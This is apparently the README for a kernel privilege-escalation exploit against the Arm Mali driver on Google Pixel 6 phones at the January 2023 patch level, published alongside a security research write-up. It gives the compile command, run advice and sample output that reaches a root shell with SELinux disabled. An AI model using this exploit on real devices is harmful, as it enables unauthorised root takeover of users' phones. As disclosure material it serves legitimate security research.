## Exploit for GHSL-2023-005

The write up can be found [here](https://github.blog/2023-04-06-pwning-pixel-6-with-a-leftover-patch). A security patch from the upstream Arm Mali driver somehow got missed out in the update for the Pixel phones and I reported it to Google in January 2023. The bug can be used to gain arbitrary kernel code execution from the untrusted app domain, which is then used to disable SELinux and gain root.

The exploit is tested on the Google Pixel 6 for devices running the January 2023 patch. For reference, I used the following command to compile it with clang in ndk-21:

```
android-ndk-r21d-linux-x86_64/android-ndk-r21d/toolchains/llvm/prebuilt/linux-x86_64/bin/aarch64-linux-android30-clang -DSHELL mali_jit.c -o mali_jit
```

The exploit should be run a couple of minutes after boot and should be fairly reliable. If failed, it can be rerun and should succeed within a few times.
If successful, it should disable SELinux and gain root.

```
oriole:/ $ /data/local/tmp/mali_jit                                          
fingerprint: google/oriole/oriole:13/TQ1A.230105.002/9325679:user/release-keys
region freed
found region 16115 at 7000200000
overwrite addr : 7ae9700710 710
overwrite addr : 7ae9500710 710
overwrite addr : 7828500710 710
overwrite addr : 7828300710 710
overwrite addr : 7828500710 710
overwrite addr : 7828300710 710
overwrite addr : 7828100710 710
overwrite addr : 7828300710 710
overwrite addr : 7828100710 710
overwrite addr : 7ae9700fd4 fd4
overwrite addr : 7ae9500fd4 fd4
overwrite addr : 7828500fd4 fd4
overwrite addr : 7828300fd4 fd4
overwrite addr : 7828500fd4 fd4
overwrite addr : 7828300fd4 fd4
overwrite addr : 7828100fd4 fd4
overwrite addr : 7828300fd4 fd4
overwrite addr : 7828100fd4 fd4
result 50
oriole:/ # 
```
